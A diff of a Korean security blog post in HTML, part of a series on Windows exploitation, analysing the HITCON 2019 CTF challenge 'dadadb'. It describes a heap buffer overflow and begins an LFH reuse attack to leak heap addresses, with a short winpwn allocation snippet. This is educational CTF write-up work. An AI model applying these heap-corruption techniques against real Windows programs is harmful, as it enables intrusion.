@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.7k 자
+      2.9k 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      33
+      57
        분
     </span>
   
@@ -240,16 +240,16 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <h1 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p>
-<p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p>
-<p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p>
-<p>안녕하세요 L0ch입니다! </p>
-<p>벌써 블로그 오픈한지 반년이 되는 4월이네요!  <del><em>그리고 다음주면 중간고사랍니다 흑ㅎ그 ㅠㅠ</em></del> </p>
+              <h1 id="&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 1 - pwntools for windows</a></p>
+<p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 2 - NT Heap</a></p>
+<p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 3 - NT Heap(2)</a></p>
+<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! </p>
+<p>&#xBC8C;&#xC368; &#xBE14;&#xB85C;&#xADF8; &#xC624;&#xD508;&#xD55C;&#xC9C0; &#xBC18;&#xB144;&#xC774; &#xB418;&#xB294; 4&#xC6D4;&#xC774;&#xB124;&#xC694;!  <del><em>&#xADF8;&#xB9AC;&#xACE0; &#xB2E4;&#xC74C;&#xC8FC;&#xBA74; &#xC911;&#xAC04;&#xACE0;&#xC0AC;&#xB78D;&#xB2C8;&#xB2E4; &#xD751;&#x314E;&#xADF8; &#x3160;&#x3160;</em></del> </p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled.png"></p>
 <blockquote>
-<p>나.. 졸업할 수 있을까..?</p>
+<p>&#xB098;.. &#xC878;&#xC5C5;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;..?</p>
 </blockquote>
-<p>시험기간에는 역시 딴 거 하는 게 제일 재밌죠. 그래서 이번 파트는 시험기간 버프를 받아 제일 재밌게 작성했습니다 ㅎㅎ; (학점과 등가 교환한 건 덤) 오늘은 HITCON 2019 Quals에 출제된 Windows pwnable 문제인 dadadb를 풀어보면서 NT Heap에서의 exploitation을 자세하게 다뤄보겠습니다! </p>
+<p>&#xC2DC;&#xD5D8;&#xAE30;&#xAC04;&#xC5D0;&#xB294; &#xC5ED;&#xC2DC; &#xB534; &#xAC70; &#xD558;&#xB294; &#xAC8C; &#xC81C;&#xC77C; &#xC7AC;&#xBC0C;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xC2DC;&#xD5D8;&#xAE30;&#xAC04; &#xBC84;&#xD504;&#xB97C; &#xBC1B;&#xC544; &#xC81C;&#xC77C; &#xC7AC;&#xBC0C;&#xAC8C; &#xC791;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;; (&#xD559;&#xC810;&#xACFC; &#xB4F1;&#xAC00; &#xAD50;&#xD658;&#xD55C; &#xAC74; &#xB364;) &#xC624;&#xB298;&#xC740; HITCON 2019 Quals&#xC5D0; &#xCD9C;&#xC81C;&#xB41C; Windows pwnable &#xBB38;&#xC81C;&#xC778; dadadb&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; NT Heap&#xC5D0;&#xC11C;&#xC758; exploitation&#xC744; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
 <h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul>
 <li>Windows x64 on windows sever 2019<ul>
 <li>Similar to Windows 10 (1809)</li>
@@ -259,84 +259,84 @@
 <li>DEP</li>
 <li>ASLR</li>
 <li>CFG</li>
-<li>자식 프로세스 생성 불가<ul>
-<li>새 프로세스 생성 불가능</li>
+<li>&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xBD88;&#xAC00;<ul>
+<li>&#xC0C8; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xBD88;&#xAC00;&#xB2A5;</li>
 </ul>
 </li>
 <li>Private Heap</li>
 </ul>
-<p>Windows 1809 (빌드 17763.1) 환경에서 진행했습니다! </p>
-<p>여담으로.. Windows10 1809 버전에서는 Windows Terminal 지원이 안돼 눈물을 머금고 winpwn의 폰트 스타일을 지원하지 않는 다른 터미널을 쓸 수 밖에 없었습니다;; 해킹할 땐 모니터가 화려해야 하는데.. 그럼 익스 안되던 것도 되는거 ㅇㅈ?</p>
+<p>Windows 1809 (&#xBE4C;&#xB4DC; 17763.1) &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
+<p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C;.. Windows10 1809 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; Windows Terminal &#xC9C0;&#xC6D0;&#xC774; &#xC548;&#xB3FC; &#xB208;&#xBB3C;&#xC744; &#xBA38;&#xAE08;&#xACE0; winpwn&#xC758; &#xD3F0;&#xD2B8; &#xC2A4;&#xD0C0;&#xC77C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB2E4;&#xB978; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xC4F8; &#xC218; &#xBC16;&#xC5D0; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;;; &#xD574;&#xD0B9;&#xD560; &#xB550; &#xBAA8;&#xB2C8;&#xD130;&#xAC00; &#xD654;&#xB824;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;.. &#xADF8;&#xB7FC; &#xC775;&#xC2A4; &#xC548;&#xB418;&#xB358; &#xAC83;&#xB3C4; &#xB418;&#xB294;&#xAC70; &#x3147;&#x3148;?</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%201.png"></p>
 <blockquote>
-<p><strong>주의</strong> 겉멋만 들면 망한다.</p>
+<p><strong>&#xC8FC;&#xC758;</strong> &#xAC89;&#xBA4B;&#xB9CC; &#xB4E4;&#xBA74; &#xB9DD;&#xD55C;&#xB2E4;.</p>
 </blockquote>
-<p>제 얘기네요 ㅎㅎ.. 아무튼, 문제 바이너리를 찬찬히 뜯어보면서 분석을 시작해보겠습니다! </p>
-<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>바이너리를 실행하면 다른 설명 없이 입력을 받는데, 1번으로 로그인할 수 있습니다. </p>
+<p>&#xC81C; &#xC598;&#xAE30;&#xB124;&#xC694; &#x314E;&#x314E;.. &#xC544;&#xBB34;&#xD2BC;, &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCC2C;&#xCC2C;&#xD788; &#xB72F;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB2E4;&#xB978; &#xC124;&#xBA85; &#xC5C6;&#xC774; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xB294;&#xB370;, 1&#xBC88;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%202.png"></p>
-<p><code>user.txt</code>에 있는 여러 계정과 패스워드 중 하나로 로그인하면 간단한 DB 기능이 구현된 걸 확인할 수 있네요.</p>
+<p><code>user.txt</code>&#xC5D0; &#xC788;&#xB294; &#xC5EC;&#xB7EC; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC911; &#xD558;&#xB098;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xBA74; &#xAC04;&#xB2E8;&#xD55C; DB &#xAE30;&#xB2A5;&#xC774; &#xAD6C;&#xD604;&#xB41C; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%203.png"></p>
 <blockquote>
-<p>user.txt의 계정과 패스워드</p>
+<p>user.txt&#xC758; &#xACC4;&#xC815;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;</p>
 </blockquote>
-<p>로그인한 이후 메뉴는 다음과 같습니다.</p>
+<p>&#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC774;&#xD6C4; &#xBA54;&#xB274;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
 <li>add<ul>
-<li>key, size, data를 입력받아 노드 추가</li>
-<li>node list에 key가 존재하면 해당 key의 data 수정</li>
+<li>key, size, data&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xB178;&#xB4DC; &#xCD94;&#xAC00;</li>
+<li>node list&#xC5D0; key&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xD574;&#xB2F9; key&#xC758; data &#xC218;&#xC815;</li>
 </ul>
 </li>
 <li>view<ul>
-<li>key를 입력받아 노드 검색 후 key와 data 출력</li>
+<li>key&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xB178;&#xB4DC; &#xAC80;&#xC0C9; &#xD6C4; key&#xC640; data &#xCD9C;&#xB825;</li>
 </ul>
 </li>
 <li>delete<ul>
-<li>key를 입력받아 해당하는 노드 삭제</li>
+<li>key&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xC544; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB178;&#xB4DC; &#xC0AD;&#xC81C;</li>
 </ul>
 </li>
 <li>logout<ul>
-<li>로그아웃하고 로그인 전으로 돌아감</li>
+<li>&#xB85C;&#xADF8;&#xC544;&#xC6C3;&#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xC804;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC10;</li>
 </ul>
 </li>
 </ol>
-<p>기능이 많지 않아 이 정도로만 정리하고 바로 취약점부터 찾아볼게요.</p>
-<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>우선 입력받은 데이터를 저장하는 구조체인 <code>node</code> 는 아래와 같으며 256개의 포인터 배열로 선언되어 있습니다.</p>
+<p>&#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC9C0; &#xC54A;&#xC544; &#xC774; &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xBC14;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xBD80;&#xD130; &#xCC3E;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p>
+<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>&#xC6B0;&#xC120; &#xC785;&#xB825;&#xBC1B;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC778; <code>node</code> &#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC73C;&#xBA70; 256&#xAC1C;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xB85C; &#xC120;&#xC5B8;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%204.png"></p>
-<pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span>
+<pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>{</span>
 	<span class="hljs-keyword">char</span>* data;
 	<span class="hljs-keyword">size_t</span> size;
 	<span class="hljs-keyword">char</span> key[<span class="hljs-number">41</span>];
 	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
-&#125;
+}
 
 <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre>
 
-<p><code>main()</code>부터 살펴보겠습니다. <code>user.txt</code> 의 계정으로 로그인 쉘을 얻은 이후의 코드입니다.</p>
+<p><code>main()</code>&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>user.txt</code> &#xC758; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xC258;&#xC744; &#xC5BB;&#xC740; &#xC774;&#xD6C4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%205.png"></p>
-<p>이중 새로운 node를 추가하는 <code>add_sub_1340()</code> 함수를 자세히 보겠습니다.</p>
+<p>&#xC774;&#xC911; &#xC0C8;&#xB85C;&#xC6B4; node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; <code>add_sub_1340()</code> &#xD568;&#xC218;&#xB97C; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%206.png"></p>
-<p><code>add_sub_1340()</code>의 node를 추가하는 부분의 코드입니다.</p>
+<p><code>add_sub_1340()</code>&#xC758; node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li><code>Key</code>를 입력받고 빨간 박스에서 현재 node list에 입력받은 <code>Key</code>값이 존재하는지 검색합니다.</li>
-<li>만약 못 찾았다면 <code>LABEL_13</code>으로 점프해 새 node를 생성하고 찾았다면 아래 코드를 진행합니다.<ul>
-<li>찾은 경우 linked list의 head에 새 node를 삽입합니다. (node[2] → node[1] → node[0]…)</li>
+<li><code>Key</code>&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; &#xBE68;&#xAC04; &#xBC15;&#xC2A4;&#xC5D0;&#xC11C; &#xD604;&#xC7AC; node list&#xC5D0; &#xC785;&#xB825;&#xBC1B;&#xC740; <code>Key</code>&#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li>&#xB9CC;&#xC57D; &#xBABB; &#xCC3E;&#xC558;&#xB2E4;&#xBA74; <code>LABEL_13</code>&#xC73C;&#xB85C; &#xC810;&#xD504;&#xD574; &#xC0C8; node&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xCC3E;&#xC558;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<ul>
+<li>&#xCC3E;&#xC740; &#xACBD;&#xC6B0; linked list&#xC758; head&#xC5D0; &#xC0C8; node&#xB97C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. (node[2] &#x2192; node[1] &#x2192; node[0]&#x2026;)</li>
 </ul>
 </li>
 </ul>
-<p>입력받은 Key값이 이미 존재하는 경우를 좀 더 자세히 볼까요?</p>
+<p>&#xC785;&#xB825;&#xBC1B;&#xC740; Key&#xAC12;&#xC774; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB97C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xBCFC;&#xAE4C;&#xC694;?</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%207.png"></p>
 <ul>
-<li>일치하는 <code>Key</code>값의 노드를 찾았으면 해당 <code>node→data</code>를 할당 해제하고 사이즈를 <code>new_size</code>에 새로 입력받습니다.</li>
-<li><code>new_size</code>의 최댓값을 <code>0x1000</code>으로 제한합니다.</li>
-<li><code>new_size</code>만큼 <code>node→data</code>에 새로 Heap을 할당합니다.</li>
-<li><code>new_size</code>만큼 새로 할당한 <code>node→data</code>에 이전에 할당된 <code>node→data</code>의 사이즈인 <code>old_size</code>만큼 입력을 받습니다.<ul>
-<li><code>new_size</code>가 <code>old_size</code>보다 작으면 Heap buffer overflow가 발생합니다.</li>
+<li>&#xC77C;&#xCE58;&#xD558;&#xB294; <code>Key</code>&#xAC12;&#xC758; &#xB178;&#xB4DC;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xD574;&#xB2F9; <code>node&#x2192;data</code>&#xB97C; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xC0AC;&#xC774;&#xC988;&#xB97C; <code>new_size</code>&#xC5D0; &#xC0C8;&#xB85C; &#xC785;&#xB825;&#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</li>
+<li><code>new_size</code>&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC744; <code>0x1000</code>&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li><code>new_size</code>&#xB9CC;&#xD07C; <code>node&#x2192;data</code>&#xC5D0; &#xC0C8;&#xB85C; Heap&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li><code>new_size</code>&#xB9CC;&#xD07C; &#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xD55C; <code>node&#x2192;data</code>&#xC5D0; &#xC774;&#xC804;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>node&#x2192;data</code>&#xC758; &#xC0AC;&#xC774;&#xC988;&#xC778; <code>old_size</code>&#xB9CC;&#xD07C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.<ul>
+<li><code>new_size</code>&#xAC00; <code>old_size</code>&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; Heap buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li>
 </ul>
 </li>
 </ul>
-<h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>먼저 Heap overflow를 이용해 Heap 주소를 leak 해보겠습니다. 오늘은 LFH를 다룰 것이기 때문에 LFH가 활성화된 chunk에서 진행하도록 할게요.</p>
+<h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>&#xBA3C;&#xC800; Heap overflow&#xB97C; &#xC774;&#xC6A9;&#xD574; Heap &#xC8FC;&#xC18C;&#xB97C; leak &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; LFH&#xB97C; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; chunk&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%208.png"></p>
-<p>node를 추가하다 보면 19번째에서 LFH 플래그가 활성화됩니다. 이후 node를 세 개만 추가해서 어떤 위치에 할당되어있는지 확인해보겠습니다.</p>
+<p>node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; 19&#xBC88;&#xC9F8;&#xC5D0;&#xC11C; LFH &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; node&#xB97C; &#xC138; &#xAC1C;&#xB9CC; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *
 
 <span class="hljs-comment">#...</span>
@@ -353,27 +353,27 @@ login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&
 	add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%209.png"></p>
-<p>LFH가 활성화된 chunk들이 무작위로 heap에 할당된 것을 볼 수 있습니다. 이렇게 무작위로 할당되어 chunk 간 거리가 불규칙하면 원하는 chunk에 접근하기 어려워집니다. 한마디로 원하는 heap layout을 구성하기 힘들어지죠. 따라서 일반적으로는 reliable 한 leak이 불가능.. 하지만! 방법이 있으니까 이런 삽질을 하는 거 아니겠어요?ㅎㅎ</p>
-<h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>자 이제 전 파트에서 배운 <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>을 써먹을 차례입니다. 무작위 할당으로 할당될 chunk 위치를 예측하기 힘들다면? 그럼 다 채워버리고 한 곳만 남겨놔서 예측 가능하게 만들면 됩니다!</p>
+<p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; chunk&#xB4E4;&#xC774; &#xBB34;&#xC791;&#xC704;&#xB85C; heap&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xBD88;&#xADDC;&#xCE59;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; chunk&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD55C;&#xB9C8;&#xB514;&#xB85C; &#xC6D0;&#xD558;&#xB294; heap layout&#xC744; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xC5B4;&#xC9C0;&#xC8E0;. &#xB530;&#xB77C;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; reliable &#xD55C; leak&#xC774; &#xBD88;&#xAC00;&#xB2A5;.. &#xD558;&#xC9C0;&#xB9CC;! &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC73C;&#xB2C8;&#xAE4C; &#xC774;&#xB7F0; &#xC0BD;&#xC9C8;&#xC744; &#xD558;&#xB294; &#xAC70; &#xC544;&#xB2C8;&#xACA0;&#xC5B4;&#xC694;?&#x314E;&#x314E;</p>
+<h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>&#xC790; &#xC774;&#xC81C; &#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xBC30;&#xC6B4; <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>&#xC744; &#xC368;&#xBA39;&#xC744; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xBB34;&#xC791;&#xC704; &#xD560;&#xB2F9;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB420; chunk &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xB2E4;&#xBA74;? &#xADF8;&#xB7FC; &#xB2E4; &#xCC44;&#xC6CC;&#xBC84;&#xB9AC;&#xACE0; &#xD55C; &#xACF3;&#xB9CC; &#xB0A8;&#xACA8;&#xB194;&#xC11C; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2010.png"></p>
 <blockquote>
-<p>선택지는 없다.</p>
+<p>&#xC120;&#xD0DD;&#xC9C0;&#xB294; &#xC5C6;&#xB2E4;.</p>
 </blockquote>
-<p>그림으로 나타내면 아래와 같습니다. </p>
+<p>&#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2011.png"></p>
 <ol>
-<li>LFH chunk로 userblock을 모두 채웁니다. </li>
-<li>임의의 chunk(여기서는 LFH5)를 해제하면 현재 userblock에는 빈 공간이 LFH5가 해제된 공간밖에 남아있지 않습니다.</li>
-<li>add LFH4로 <code>LFH4→data</code>를 다시 할당하면 LFH는 해제된 chunk 우선으로 할당하게 되어 해제된 LFH5 공간에 새로 data를 할당합니다.  </li>
-<li>3번의 과정에서 overflow 취약점이 있으니 이제 씹고 뜯고 맛보고 즐기기만 하면 됩니다!</li>
+<li>LFH chunk&#xB85C; userblock&#xC744; &#xBAA8;&#xB450; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;. </li>
